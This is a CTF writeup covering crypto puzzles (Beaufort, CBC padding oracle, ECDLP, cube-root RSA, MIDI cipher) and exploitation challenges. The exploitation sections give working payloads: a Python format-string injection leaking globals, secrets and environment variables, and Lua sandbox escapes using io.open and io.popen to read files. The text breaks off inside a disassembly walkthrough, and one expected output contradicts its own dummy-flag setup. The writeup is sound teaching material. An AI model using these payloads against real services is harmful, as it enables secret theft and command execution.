# Pointer Overflow CTF 2026

Writeups for the crypto and exploitation challenges in this directory. The
solver or payload for each challenge lives alongside this file.

All solvers run from the repository's Nix dev shell, which provides SBCL for
the Lisp solvers, uv for Python, and Lua 5.4 for the sandbox payload:

```console
nix develop
```

The Lisp solvers run with `sbcl --script <file>`, the Python solvers run with
`uv run <file>`, and the Lua payload is submitted to SafeLua as user code.

## crypto-01: Letters Never Sent

**Solver:** `crypto-01-letters-never-sent.lisp`

### The puzzle

The challenge presents a compass rose with six points marked by red stars and
labelled **Tulip**, **Anchor**, **Lily**, **Lily**, **Oak**, and **Willow**.
Reading clockwise from the top and taking the initials gives:

```
T A L L O W
```

The text also mentions Francis Beaufort and a "reciprocal tableau", which
points at the **Beaufort cipher**. The supplied ciphertext keeps the flag's shape,
including the braces, dots, and digits:

```
EMJSJ{2.1619.TQIQFV4AQTM47QAL.JGCMS6O6XPI4LOFDSKARDNR7EM}
```

### Beaufort cipher

The Beaufort cipher is a reciprocal Vigenère variant. Encryption and
decryption use the same relation:

$$
P_i = (K_i - C_i) \bmod 26
$$

Only ASCII letters advance the key; punctuation and digits pass through
unchanged. That is important here, since the flag is full of dots and digits.

```lisp
(defun beaufort (text key)
  "Apply the reciprocal Beaufort cipher to ASCII letters in TEXT."
  (let ((position 0))
    (map 'string
         (lambda (c)
           (if (and (char<= #\A c) (char<= c #\Z))
               (prog1
                   (code-char (+ (char-code #\A)
                                 (mod (- (char-code (char key (mod position (length key))))
                                         (char-code c))
                                      26)))
                 (incf position))
               c))
         text)))
```

The first five letters decrypt to `POCTF`, confirming the key:

```
EMJSJ -> POCTF
```

### Flag

```
POCTF{2.1619.DDSVGT4WDHZ47VOL.KUJZW6I6WLD4AARQIBLXTGJ7HZ}
```

## crypto-02: Apparatus

**Solver:** `crypto-02-apparatus.lisp`

### The puzzle

A 3×3 board is labelled

```
A B C
D E F
G H I
```

The final position has **X** on B, C, E, G and **O** on A, D, I. X moves
first and wins on move seven (four X moves, three O moves). The key is not the
final board itself but the **order of the moves** that produces it.

We enumerate every alternating move order and prune aggressively:

- reject the branch as soon as O has a winning line;
- reject X winning before the seventh move;
- accept a sequence of length seven only if X has a winning line at the end.

That leaves 108 candidate keys. To identify the right one, each candidate is
used to decrypt a short secondary ciphertext; the key whose plaintext reads as
English (the solver searches for ` the `) is the real one.

The winning key is:

```
BAEDGIC
```

That is: X plays B, O plays A, X plays E, O plays D, X plays G, O plays I, and
X plays C for the win.

### The cipher

This one is a Vigenère variant over all 95 printable ASCII characters (space
through tilde), with key letters A=0 through Z=25:

$$
\begin{aligned}
C &= 32 + \bigl((P - 32) + (K - 65)\bigr) \bmod 95 \\
P &= 32 + \bigl((C - 32) - (K - 65)\bigr) \bmod 95
\end{aligned}
$$

Note that every printable character is shifted, not just letters. This is why
the ciphertext contains punctuation and mixed case.

### Result

Decrypting the two ciphertexts with `BAEDGIC` gives:

```
Primary:   POCTF{5.1619.BFNVVDUWGGVY4XRL.GBCZ7XM63RBP6YCC52GYYRHEXZ}
Secondary: By salt and by ash, by the breath drawn but not returned, we open the way.
```

The secondary message is a nice piece of flavour: the "apparatus" is opened
only by the correct sequence of moves.

### Flag

```
POCTF{5.1619.BFNVVDUWGGVY4XRL.GBCZ7XM63RBP6YCC52GYYRHEXZ}
```

## crypto-03: The Consulting Room

**Solver:** `crypto-03-consulting-room.sh`

### The oracle

The challenge exposes an HTTP endpoint that accepts a hex-encoded record:

```http
POST /challenges/consulting-room/oracle
Authorization: Bearer <token>
Content-Type: application/json

{"record": "<hex>"}
```

The record is a CBC ciphertext prefixed with its IV. The server decrypts it
and answers:

- **HTTP 200** — valid PKCS#7 padding;
- **HTTP 400** — invalid padding.

That is a textbook CBC padding oracle: we never need the AES key, only the
yes/no answer.

### Recovering a block

For each ciphertext block $C_i$, treat it as the last block and supply a
chosen IV $A$. The oracle checks the padding of

$$
D(C_i) \oplus A
$$

We recover $D(C_i)$ byte by byte, from the last byte backwards. For byte
position $p$, guess $g$, set $A[p] = g$, and for every already-known byte
$k > p$ set

$$
A[k] = D(C_i)[k] \oplus (16 - p)
$$

so those bytes decrypt to the expected padding value. A 200 means

$$
D(C_i)[p] = g \oplus (16 - p)
$$

Once the whole intermediate value is known, the plaintext block is simply

$$
P_i = D(C_i) \oplus C_{i-1}
$$

The last byte needs one extra check: ciphertexts ending in `02 02` also pass
when we are looking for a single `01`. After a 200 at the last position, the
solver flips byte 14 of the IV and asks again. A genuine `0x01` padding stays
valid; any longer padding is broken by the flip. Without this check the attack
can lock onto the wrong value.

### The twist: an unreliable proxy

The interesting part is not the oracle itself but the transport. The proxy
silently swallows a request every few tries: the TCP connection and TLS stay
up, but that particular request never returns. A naive sequential attack
stalls forever.

The solver works around this with HTTP/2 multiplexing. All 256 guesses for one
byte are sent as parallel streams on a single TLS connection
(`curl --http2 --parallel --parallel-max 6`), so one swallowed stream does not
block the other 255. Only guesses that never came back are re-asked. The few
that survive several parallel rounds are swept one at a time over a fresh
connection.

Two practical details:

- the connection dies after a few dozen requests, so transfers are sent in
  chunks of 50, each chunk opening a fresh connection;
- six parallel streams keep the request rate under the server's limit of
  1000 requests per minute.

The script also checkpoints after every recovered byte, keyed by the target
ciphertext block, so a killed run resumes where it stopped instead of starting
the block over.

### Recovered blocks

The record is an IV plus four ciphertext blocks. The recovered intermediate
values and plaintext blocks are:

| Block | $D(C_i)$ | Plaintext |
|-------|-----------|-----------|
| 0 | `e9201be0e5c5056cb0c48c1d82857b51` | `POCTF{72.1619.SJ` |
| 1 | `9c7ff77d3e79e1769c07251050e07bfc` | `M23L4UOHQLVK2A.7` |
| 2 | `d9001af2e05b6e3378f5d56dd0eded27` | `T27T36CQJKWPXIV5` |
| 3 | `7a0581a0b1a4a9827297205570d87a63` | `KB5W5MTPF}` + six bytes of `0x06` padding |

Stripping the PKCS#7 padding leaves the flag.

### Flag

```
POCTF{72.1619.SJM23L4UOHQLVK2A.7T27T36CQJKWPXIV5KB5W5MTPF}
```

## crypto-04: A Map of Small Things

**Solver:** `crypto-04-map-of-small-things.py`

**Category:** crypto

**Tags:** elliptic-curve, ECDLP, supersingular, smooth-order,
Pohlig-Hellman, baby-step giant-step

### The curve

The challenge gives

```text
y^2 = x^3 + x  over F_p
p = 17759930830448937043
G = (2, 2130375071143573863)
Q = (3021250187620952397, 10766220228950080733)
```

Since `p = 3 (mod 4)`, this curve is supersingular and its group order is

```text
#E(F_p) = p + 1 = 17759930830448937044
        = 2^2 * 38603 * 121123 * 949584469
```

All prime factors are small. The largest is below `2^30`, so the
elliptic-curve discrete logarithm can be solved with Pohlig-Hellman rather
than a generic attack on the full 64-bit group.

### Recovering the private key

For each prime power `q^e` dividing the group order, project the generator
and public key into the `q^e`-torsion subgroup:

```text
G_q = (n / q^e) * G
Q_q = (n / q^e) * Q
```

Then solve `Q_q = x_q * G_q` with baby-step giant-step. The residues are:

| `q^e` | `k mod q^e` |
|-------|-------------|
| 4 | 1 |
| 38603 | 8518 |
| 121123 | 49613 |
| 949584469 | 555889720 |

Combining them with the Chinese remainder theorem gives

```text
k = 7402776758243033309
```

The solver verifies the result by checking `k * G == Q`.

### Flag

```text
POCTF{7402776758243033309}
```

The raw decimal integer `7402776758243033309` is also accepted.

## crypto-07: The Notary's Seal

**Solver:** `crypto-07-notary-seal.py`

### The setup

A document is treated as an integer $m$ and sealed with the notary's RSA
public key $(n, e)$:

$$
s \equiv m^e \pmod n
$$

We are given a 2048-bit modulus $n$, the public exponent $e = 3$, and the
seal $s$. The goal is to recover the document and submit it verbatim.

The important sentence is "the notary is not a careful notary": this is
**textbook RSA** with no padding, applied to a short message.

### What kind of problem this is

This is not a factoring challenge, and we never need the private exponent
$d$. It is a **low public exponent attack**, specifically the case where the
message is so short that the modular reduction never happens.

Compare the sizes:

| Value | Size |
|-------|------|
| $n$ | 2048 bits |
| $s$ | 1387 bits |

Since $s < n$ and $e = 3$, the seal cannot be a wrapped residue. It must be
the plain integer cube of the document:

$$
s = m^3
$$

So the document is just the integer cube root:

$$
m = \sqrt[3]{s}
$$

This is also visible from the bit lengths: $1387 \approx 3 \times 463$, so the
document is a 463-bit integer, far below the 2048-bit modulus.

### Recovering the document

An integer cube root is computed with binary search (or Newton's method),
followed by an exact check:

```python
def iroot(value: int, degree: int) -> int:
    """Return floor(value ** (1 / degree))."""
    low = 1
    high = 1 << (value.bit_length() // degree + 1)
    while low < high:
        mid = (low + high + 1) // 2
        if mid**degree <= value:
            low = mid
        else:
            high = mid - 1
    return low


m = iroot(SEAL, 3)
assert pow(m, 3) == SEAL

document = m.to_bytes((m.bit_length() + 7) // 8, "big")
print(document.decode())
```

The solver is a plain Python script run through uv from the Nix dev shell:

```console
nix develop
uv run competitions/p/pointeroverflowctf/2026-10/crypto-07-notary-seal.py
n    = 2048 bits
seal = 1387 bits
e    = 3
m    = 463 bits
doc  = POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}
```

The exact equality `m ** 3 == SEAL` confirms that no modular reduction took
place and that the recovered integer is the original document.

### Why the attack stops working otherwise

If the seal had been at least $n$, the cube root of the residue would not be
the message. Two related attacks then apply:

- **Coppersmith's small-root attack** when $m < n^{1/e}$: find small roots of
  $x^e - s \equiv 0 \pmod n$ with lattice reduction.
- **Håstad's broadcast attack** when the same unpadded message is sent to at
  least $e$ recipients with different moduli: combine the residues with CRT
  to recover $m^e$ over the integers, then take the $e$-th root.

Real RSA avoids all of this by using randomized padding (OAEP or PKCS#1
v1.5), which makes the encoded message large and unpredictable. The careless
notary did neither.

### Flag

```
POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}
```

## crypto-08: Forty Measures Deep

**Solver:** `crypto-08-forty-measures-deep.py`
**Attachment:** `attachments/score.mid`

### The file

First run `xxd` to see its binary:

```console
$ xxd score.mid 
00000000: 4d54 6864 0000 0006 0000 0001 01e0 4d54  MThd..........MT
00000010: 726b 0000 0234 00ff 5103 0b71 b000 ff58  rk...4..Q..q...X
00000020: 0404 0218 0800 ff03 1346 6f72 7479 204d  .........Forty M
00000030: 6561 7375 7265 7320 4465 6570 0090 5040  easures Deep..P@
00000040: 8360 8050 0000 904f 4083 6080 4f00 0090  .`.P...O@.`.O...
00000050: 4340 8360 8043 0000 9054 4083 6080 5400  C@.`.C...T@.`.T.
00000060: 0090 4640 8360 8046 0000 9040 4083 6080  ..F@.`.F...@@.`.
...
000001d0: 0000 905a 4083 6080 5a00 0090 3740 8360  ...Z@.`.Z...7@.`
000001e0: 8037 0000 903a 4083 6080 3a00 0090 4940  .7...:@.`.:...I@
000001f0: 8360 8049 0000 904e 4083 6080 4e00 0090  .`.I...N@.`.N...
00000200: 4940 8360 8049 0000 904e 4083 6080 4e00  I@.`.I...N@.`.N.
00000210: 0090 4640 8360 8046 0000 904a 4083 6080  ..F@.`.F...J@.`.
00000220: 4a00 0090 5640 8360 8056 0000 9044 4083  J...V@.`.V...D@.
00000230: 6080 4400 0090 5440 8360 8054 0000 905b  `.D...T@.`.T...[
00000240: 4083 6080 5b00 00ff 2f00                 @.`.[.../.
```

MIDI file starts with `MThd` as header:
- header: `00 00 00 06`, 6
- format: `00 00`, 0, monophonic track
- track number: `00 01`, 1
- PPQ: `01 e0`, a quarter note at 480 PPQ
- track name: "Forty Measures Deep"

`MTrk` is the header of track:
- length: `02 34`, 0x234, 564 bytes

Track data is a sequence of events, every event consists of Delta-Time and 
content of events

We do not need to perform the score; we need its pitch numbers. Parse the
track and collect every note-on event.

### The musical alphabet

The known plaintext `POCTF` maps the first five notes as follows:

| Note | Character |
|------|-----------|
| 80 | `P` |
| 79 | `O` |
| 67 | `C` |
| 84 | `T` |
| 70 | `F` |

Those are exactly the ASCII codes of the letters, but the rest of the notes
are not simply ASCII: the sixth note is 64, where the flag format requires
`{`, and the following notes are 60, 57, and so on. The flag format provides
the rest of the crib:

```
POCTF{XX.XXXX.<random>}
```

Combining the crib with the observed notes reveals a consecutive mapping:

| Note | 53 | 54 | ... | 62 | 63 | 64 | 65 | ... | 90 | 91 |
|------|----|----|-----|----|----|----|----|-----|----|----|
| Char | `0` | `1` | ... | `9` | `.` | `{` | `A` | ... | `Z` | `}` |

The private alphabet is therefore

```
0123456789.{ABCDEFGHIJKLMNOPQRSTUVWXYZ}
```

and a note decodes with `note - 53`. In musical terms, the 39-symbol alphabet
is laid out as a chromatic scale starting at MIDI note 53 (F3). The letters
happen to retain their ASCII values.

### Decoding

Once the base note is known, decoding is a table lookup:

```python
ALPHABET = "0123456789.{ABCDEFGHIJKLMNOPQRSTUVWXYZ}"

def decode(notes):
    return "".join(ALPHABET[note - 53] for note in notes)
```

The solver parses the Standard MIDI File directly with the Python standard
library, handling variable-length quantities, meta events, note-on/note-off
events, and running status. No extra dependency is needed.

```console
nix develop
uv run competitions/p/pointeroverflowctf/2026-10/crypto-08-forty-measures-deep.py
notes: 58
flag:  POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
```

### Flag

```
POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
```

## exploit-01: Read Me My Fortune

**Solver:** `exploit-01-read-my-fortune.py`
**Service source:** `attachments/exploit-01/`

### The setup

The challenge ships the full service source, which is unusually generous:

```python
reading = template.format(
    name=name, sign=sign, date=date, elara=_greet,
)
```

The player controls `template` completely. The only intended placeholders are
`{name}`, `{sign}`, `{date}`, and `{elara}`. The flag is a module-level global
created after the token check:

```python
FLAG = None

def main():
    global FLAG
    ...
    FLAG = _build_marker(cid, team_id, nonce)
```

So the goal is not to break the token check at all: the service derives the
team flag for you and then hands you a string-formatting primitive in the same
process.

### Why `.format()` is dangerous

Python's `str.format` is not a template language with variables; it is an
object-graph walker. Each field is parsed as

```text
field_name ::= arg_name ("." attribute_name | "[" element_index "]")*
```

`arg_name` may be a name or a number, and every attribute access is a real
`getattr` and every index is a real `__getitem__`. So `{elara}` does not just
print the function, it gives you the function object, and you can keep walking:

```python
{elara.__globals__[FLAG]}
```

`_greet` is defined in `service.py`, so `_greet.__globals__` is the module
globals dict of `__main__`, which is exactly where `FLAG` was assigned.

### The exploit

The payload is one line:

```text
{elara.__globals__[FLAG]}
```

`FLAG` is an unquoted element index, so it is looked up as the string
`"FLAG"` in the globals dict. Rendering that field yields the flag directly.

Full interaction:

```console
$ nc <host> <port>
...
  Token: EXP1.1619.127.IQGHFCSX77GP7HGI.1794545666.J4NMBQWH22DMTD5B4LIZM7UDOV

  Welcome, member of team #1619. Your consultation is confirmed.
...
  What is your name? seeker
  What is your star sign? Ophiuchus
...
  Template: {elara.__globals__[FLAG]}

  ── Your Reading ─────────────────────────────────────────────
  POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}
  ─────────────────────────────────────────────────────────────
```

### What else is reachable

Once you can walk attributes, the whole process is in scope. Useful paths:

| Payload | Result |
|---------|--------|
| `{elara.__globals__[FLAG]}` | the flag |
| `{elara.__globals__}` | the whole module dict, including secrets |
| `{elara.__globals__[FLAG_HMAC_SECRET]}` | the flag-signing secret |
| `{elara.__globals__[os].environ}` | environment variables |

The last two matter beyond this challenge: `FLAG_HMAC_SECRET` signs the
session tokens, so leaking it would allow forging a token for any team and
challenge, which is why the service is careful never to print a traceback in
production.

### Flag

```text
POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}
```

## exploit-03: The Sandglass

**Payload:** `exploit-03-the-sandglass.lua`

### The setup

SafeLua v0.9 builds a fresh environment containing only a small set of
globals. It also copies `io` into that environment so that user code can read
configuration files:

```lua
-- Copy io for config file reads. TODO(mchetti): filter to just read/write.
local safe_io = {}
for k, v in pairs(io) do safe_io[k] = v end
safe_env.io = safe_io
```

The comment states the intended restriction: only `io.read` and `io.write`
should be exposed. The implementation does not do that. `pairs(io)` copies
every field of the standard `io` table, including:

- `io.open` — open and read any path the process can access
- `io.lines` — read any file line by line
- `io.popen` — spawn a shell command and read its output
- `io.tmpfile`, `io.output`, `io.input`, and the standard streams

The rest of the whitelist is not relevant here. There is no need to recover
`load`, find `_G`, or reach `os` or `debug`; the file-read primitive is already
in the sandbox.

### The exploit

The challenge exposes `team_id` as a global and gives the flag path:

```text
/tmp/poctf/sandglass/flag-<team_id>.txt
```

Since `io.open` is available, user code can construct that path, read the
file, and return its contents. The wrapper passes the return value through
`tostring(result)`, so the flag is printed as the submission result:

```lua
local path = "/tmp/poctf/sandglass/flag-" .. tostring(team_id) .. ".txt"

local file, err = io.open(path, "r")
if not file then
    error("io.open failed: " .. tostring(err))
end

local flag = file:read("*a")
file:close()
return flag
```

No sandbox escape beyond the `io` library is needed. The vulnerability is
simply that the developer copied the whole library instead of selecting the
two safe functions.

If a deployment also removed `io.open`, the same bug exposes a command
execution primitive through `io.popen`:

```lua
local path = "/tmp/poctf/sandglass/flag-" .. tostring(team_id) .. ".txt"
local pipe = assert(io.popen("cat " .. path))
local flag = pipe:read("*a")
pipe:close()
return flag
```

(This is not supported in platform: `runtime error: [string "sandbox"]:2: 'popen' not supported`)

### Local verification

The repository dev shell provides Lua 5.4:

```console
nix develop
lua -v
```

A minimal harness can reproduce the server's `load` call and create a dummy
flag file:

```lua
-- harness.lua
local team_id = assert(tonumber(arg[2]))
local source = assert(io.open(arg[1])):read("*a")

local safe_env = {}
for _, name in ipairs({
    "print", "tostring", "tonumber", "type", "select",
    "pairs", "ipairs", "next", "pcall", "xpcall", "error",
    "string", "math", "table",
}) do
    safe_env[name] = _G[name]
end

local safe_io = {}
for k, v in pairs(io) do safe_io[k] = v end
safe_env.io = safe_io
safe_env.team_id = team_id

local chunk = assert(load(source, "sandbox", "t", safe_env))
local ok, result = pcall(chunk)
print(ok and result or ("runtime error: " .. tostring(result)))
```

Run it with a dummy flag:

```console
mkdir -p /tmp/poctf/sandglass
printf 'POCTF{local-test}\n' > /tmp/poctf/sandglass/flag-1234.txt
lua harness.lua exploit-03-the-sandglass.lua 1234
```

Expected output:

```text
POCTF{128.1619.687dd42ffb219159.H4NH7DMPZGZUPGEWF3UQSSIWCJ}
```

The real submission returns the flag for the current team; the flag itself is
team-specific and is not hardcoded in the payload.

### Fix

Expose only the intended functions:

```lua
safe_env.io = {
    read = io.read,
    write = io.write,
}
```

If configuration-file access is genuinely required, wrap `io.open` with a
path allowlist and do not expose `io.popen`, `io.lines`, `io.tmpfile`, or the
raw `io` table.

## exploit-05: What the Heap Remembers

**Solver:** `exploit-05-what-the-heap-remembers.py`
**Attachment:** `attachments/heap-1619.zip`

### The setup

First use `strings` to find important embbeded strings in `heap`:

```text
$ strings -tx heap
   ....
    3a4 /lib64/ld-linux-x86-64.so.2
    571 fgets
    577 stdin
    57d putc
    582 __stack_chk_fail
    593 __printf_chk
    5a0 __isoc23_sscanf
    5b0 __memcpy_chk
    5bd strnlen
    5c5 stdout
    5cc __libc_start_main
    5de __memset_chk
    5eb __cxa_finalize
   ....
   2004 alloc %zu
   200e handle=%d
   2019 free %d
   2021 write %d %127[^
   2033 read %d
   203b %02x
   2040 quit
   2060 heap:131:1619:v2
```

The supplied file is a stripped PIE x86_64 binary implementing a small
interactive slab allocator. Its commands are:

```text
alloc <size>
free <index>
write <index> <text>
read <index>
quit
```

Then we use `objdump` to analyse the disassembly of `heap`:

```asm
heap:     file format elf64-x86-64

...

Disassembly of section .text:

0000000000001140 <.text>:
    1140:	f3 0f 1e fa          	endbr64
    1144:	41 55                	push   r13
    1146:	b8 b9 79 37 9e       	mov    eax,0x9e3779b9
    # move constant `0x9e3779b9` into register eax
    114b:	ba 68 00 00 00       	mov    edx,0x68
    # move constant `0x68` (in char 'h') into register edx
    1150:	41 54                	push   r12
    1152:	55                   	push   rbp
    1153:	53                   	push   rbx
    # These pushed registers are called "callee-saved registers", they will be popped in
    # the end of functions

    1154:	48 81 ec c8 01 00 00 	sub    rsp,0x1c8
    115b:	64 48 8b 0c 25 28 00 	mov    rcx,QWORD PTR fs:0x28
    1162:	00 00 
    1164:	48 89 8c 24 b8 01 00 	mov    QWORD PTR [rsp+0x1b8],rcx
    116b:	00 
    116c:	48 8d 0d ed 0e 00 00 	lea    rcx,[rip+0xeed]        # 2060 <__memset_chk@plt+0xf30>
    # `rip` always stores the next executed command, `r` stands for 64-bit extension,
    # `ip` stands for "instruction pointer". So the offset of `rip` is 1173, `[rip+0xeed]` is
    # offset `0x1173 + 0xeed = 0x2060` (and that's why objdump calculates the offset 2060
    # automatically). Operation `lea` stands for "load effective address", so register only
    # stores the address of constnt string in address offset 0x2060, by `strings` we know the
    # constant string is "heap:131:1619:v2"

    1173:	66 90                	xchg   ax,ax
    1175:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
    117c:	00 00 00 00 
    # nop (alignment empty operations), let 0x1180 offset can be divided by 16 bytes:
    # 0x1180 / 16 = 280 (becasue cpu reads operations from memory chunk by chunk, those chunks
    # are usually 16 bytes or 32 bytes, called cache line / fetch block)

    # <begin: murmur-hash>

    1180:	31 c2                	xor    edx,eax
    # edx now is 'h', eax stores the constant 0x9e3779b9, the result of $edx xor eax$ will
    # be stored in `edx`.

    1182:	48 83 c1 01          	add    rcx,0x1
    # remember, `rcx` is a pointer to offset 0x2060 (which is constant string "heap:131:1619:v2"),
    # now `rcx = rcx + 0x1`, it points to the next character `e`

    1186:	69 c2 95 e9 d1 5b    	imul   eax,edx,0x5bd1e995
    # imul has three parameters: eax = edx * 0x5bd1e995 (this is classical constant of MurmurHash)
    118c:	89 c2                	mov    edx,eax
    # move value of eax to edx
    118e:	c1 ea 0f             	shr    edx,0xf
    # right shift the value of edx 15 digits
    1191:	31 d0                	xor    eax,edx
    # eax = eax xor edx, (state ^= state >> 15)
    1193:	0f b6 11             	movzx  edx,BYTE PTR [rcx]
    # movzx stands for "move with zero extend", edx reads the one byte where rcx points, low 8
    # bits store this value and high 24 bits are 0.
    1196:	84 d2                	test   dl,dl
    # dl register is the low 8 bits of edx (registers have levels), this will test the input character
    # is whether '\0'
    1198:	75 e6                	jne    1180 <__memset_chk@plt+0x50>

    # <end: murmur-hash>
```

Above is the main disassembly logic of algorithm MurmurHashV2, using function
`calculate_murmur_hash_seed` defined in `exploit-05-what-the-heap-remembers` we
can get the final seed is `1209858405`. We can also use `gdb` to print the result
of register `eax`:

```gdb
starti
info proc mappings
break *(<base> + 0x119a)
continue
info registers eax
# eax            0x481cf965          1209858405
```

Now we analyse the logic of remaining part:

```asm
    <begin: lcg>
    119a:	48 8d 2d bf 2e 00 00 	lea    rbp,[rip+0x2ebf]        # 4060 <stdin@GLIBC_2.2.5+0x30>
    # Here offset 0x4060 is the address offset of slab in .bss part
    11a1:	48 89 ea             	mov    rdx,rbp
    # rbp stands for "64-bit base pointer", rbp is assigned to rdx, so rdx points to the start
    # of slab. From 11c6 we know that rdx is the write pointer
    11a4:	48 8d 75 3b          	lea    rsi,[rbp+0x3b]
    # !!! important, rsi has offset 0x3b = 59 bytes from rbp (start of slab)
    11a8:	66 90                	xchg   ax,ax
    11aa:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
    11b1:	00 00 00 00 
    11b5:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
    11bc:	00 00 00 00 

    11c0:	69 c0 6d 4e c6 41    	imul   eax,eax,0x41c64e6d
    # eax = eax * 0x41c64e6d
    11c6:	48 83 c2 01          	add    rdx,0x1
    # rdx = rdx + 1
    11ca:	05 39 30 00 00       	add    eax,0x3039
    # eax = eax + 0x3039
    11cf:	89 c1                	mov    ecx,eax
    # ecx = eax
    11d1:	c1 e9 10             	shr    ecx,0x10
    # ecx = ecx >> 16, ecx now is the 16-23 digits of eax
    11d4:	88 4a ff             	mov    BYTE PTR [rdx-0x1],cl
    # write the lower 8 bits of ecx to rdx - 0x1 (which is current cell we want to write to)
    11d7:	48 39 d6             	cmp    rsi,rdx
    # compare the rsi pointer and writing pointer
    11da:	75 e4                	jne    11c0 <__memset_chk@plt+0x90>

    <end: lcg>
```

We can simulate the LCG algorithm in python script, using `calculate_lcg_key` function
and we can obtain a bytes of key:

```python
def calculate_lcg_key(seed: int) -> bytes:
    key = bytearray()
    mask = 0xffffffff
    for _ in range(59):
        seed = (seed * 0x41c64e6d + 0x3039) & mask
        key.append((seed >> 16) & 0xff)
    return bytes(key)
    # 0x555555558060: 0x71    0xaf    0xf7    0x68    0x3b    0xdb    0x03    0x49
    # 0x555555558068: 0x12    0xfb    0xc9    0x1a    0x0d    0x8f    0xf9    0xd8
    # 0x555555558070: 0x7f    0xc2    0x09    0xa0    0xbc    0x44    0xe2    0xec
    # 0x555555558078: 0xac    0xe5    0x4b    0x8c    0x11    0xf6    0x16    0x67
    # 0x555555558080: 0x98    0x60    0x0c    0xef    0xa1    0x81    0x9a    0x65
    # 0x555555558088: 0xce    0xca    0x38    0xd2    0x4d    0x19    0x9d    0xc1
    # 0x555555558090: 0xe6    0xd7    0xa4    0xbd    0xc3    0xd1    0xfc    0x8d
    # 0x555555558098: 0x03    0xd7    0x92 
```

or we can read the key in `gdb` by

```gdb
starti
info proc mappings
break *(<base> + 0x11dc)
continue
set $slab = <base> + 0x4060
x/59xb $slab
```

Finally we can find the ciphertext bytes in `.rodata` section:

```txt
$ objdump -s -j .rodata attachments/heap-1619/heap 

attachments/heap-1619/heap:     file format elf64-x86-64

Contents of section .rodata:
 2000 01000200 616c6c6f 6320257a 75006861  ....alloc %zu.ha
 2010 6e646c65 3d25640a 00667265 65202564  ndle=%d..free %d
 2020 00777269 74652025 64202531 32375b5e  .write %d %127[^
 2030 0a5d0072 65616420 25640025 30327800  .].read %d.%02x.
 2040 71756974 00000000 00000000 00000000  quit............
 2050 00000000 00000000 00000000 00000000  ................
 2060 68656170 3a313331 3a313631 393a7632  heap:131:1619:v2
 2070 00000000 00000000 00000000 00000000  ................
 # ciphertext
 2080 21e0b43c 7da0327a 23d5f82c 3cb6d7be  !..<}.2z#..,<...
 2090 1ca33199 dd25d18a 98d57cbb 28c52249  ..1..%....|.(."I
 20a0 d2555bba f3b2de56 8c85709e 7b41df8b  .U[....V..p.{A..
 20b0 aa98f1f3 8f90bace 449cef             ........D..  
```

We xor the ciphertext with key and here is the flag!

```txt
$ uv run exploit-05-what-the-heap-remembers.py
Seed of MurmurHashV2 is 1209858405
Key of LCG is b'q\xaf\xf7h;\xdb\x03I\x12\xfb\xc9\x1a\r\x8f\xf9\xd8\x7f\xc2\t\xa0\xbcD\xe2\xec\xac\xe5K\x8c\x11\xf6\x16g\x98`\x0c\xef\xa1\x81\x9ae\xce\xca8\xd2M\x19\x9d\xc1\xe6\xd7\xa4\xbd\xc3\xd1\xfc\x8d\x03\xd7\x92'
Flag is POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}
```

### The bug

This ctf problem can be hacked with static python script to find the flag.
But there is another way to read the key by program itself.

```asm
    11dc:	48 c7 05 59 2e 00 00 	mov    QWORD PTR [rip+0x2e59],0x3b        # 4040 <stdin@GLIBC_2.2.5+0x10>
    # now set the value of heap top 0x4040 to 0x3b
    11e3:	3b 00 00 00 
    11e7:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
    11ee:	00 00 
    11f0:	48 8b 15 39 2e 00 00 	mov    rdx,QWORD PTR [rip+0x2e39]        # 4030 <stdin@GLIBC_2.2.5>
    # 0x4030 is the global variable `stdin`, set rdx to `stdin`
    11f7:	be 00 01 00 00       	mov    esi,0x100
    # second parameter of function `fgets`, it can only read 255 characters with one final '\0'
    11fc:	48 8d bc 24 b0 00 00 	lea    rdi,[rsp+0xb0]
    1203:	00 
    1204:	e8 e7 fe ff ff       	call   10f0 <fgets@plt>
    # call fgets function
    1209:	48 85 c0             	test   rax,rax
    # the return value of function fgets will be stored in rax. If sucess, it will return buffer.
    # If the input is EOF, it will jump to 0x1332
    120c:	0f 84 20 01 00 00    	je     1332 <__memset_chk@plt+0x202>

    1212:	66 0f ef c0          	pxor   xmm0,xmm0
    1216:	31 c0                	xor    eax,eax
    1218:	48 8d 54 24 28       	lea    rdx,[rsp+0x28]
    # alloc size stores in [rsp + 0x28]
    121d:	48 8d 35 e0 0d 00 00 	lea    rsi,[rip+0xde0]        # 2004 <__memset_chk@plt+0xed4>
    # 0x2004 stores string "alloc %zu", rsi points to the constant string.
    1224:	48 8d bc 24 b0 00 00 	lea    rdi,[rsp+0xb0]
    122b:	00 
    122c:	0f 29 44 24 30       	movaps XMMWORD PTR [rsp+0x30],xmm0
    1231:	0f 29 44 24 40       	movaps XMMWORD PTR [rsp+0x40],xmm0
    1236:	0f 29 44 24 50       	movaps XMMWORD PTR [rsp+0x50],xmm0
    123b:	0f 29 44 24 60       	movaps XMMWORD PTR [rsp+0x60],xmm0
    1240:	0f 29 44 24 70       	movaps XMMWORD PTR [rsp+0x70],xmm0
    1245:	0f 29 84 24 80 00 00 	movaps XMMWORD PTR [rsp+0x80],xmm0
    124c:	00 
    124d:	0f 29 84 24 90 00 00 	movaps XMMWORD PTR [rsp+0x90],xmm0
    1254:	00 
    1255:	0f 29 84 24 a0 00 00 	movaps XMMWORD PTR [rsp+0xa0],xmm0
    125c:	00 

    <begin: alloc>

    125d:	e8 5e fe ff ff       	call   10c0 <__isoc23_sscanf@plt>
    1262:	83 f8 01             	cmp    eax,0x1
    # call sscanf, parameters are rdi=buf, rsi="alloc %zu", rdx=&size
    # If the function reads the alloc size successfully, it will return 0x1
    1265:	75 49                	jne    12b0 <__memset_chk@plt+0x180>
